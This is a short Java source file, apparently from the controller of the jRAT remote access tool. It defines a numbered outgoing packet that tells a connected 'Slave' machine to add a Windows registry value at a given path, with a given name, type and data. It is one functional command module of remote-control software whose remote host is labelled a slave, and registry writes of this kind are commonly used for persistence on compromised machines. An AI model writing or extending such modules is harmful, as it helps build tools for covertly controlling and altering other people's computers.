package jrat.module.registry;

import io.jrat.controller.Slave;
import io.jrat.controller.packets.outgoing.AbstractOutgoingPacket;

import java.io.DataOutputStream;


public class Packet97RegistryAdd extends AbstractOutgoingPacket {

	private String path;
	private String name;
	private String type;
	private String data;

	public Packet97RegistryAdd(String path, String name, String type, String data) {
		this.path = path;
		this.name = name;
		this.type = type;
		this.data = data;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.writeLine(path);
		slave.writeLine(name);
		slave.writeLine(type);
		slave.writeLine(data);
	}

	@Override
	public short getPacketId() {
		return 97;
	}

}
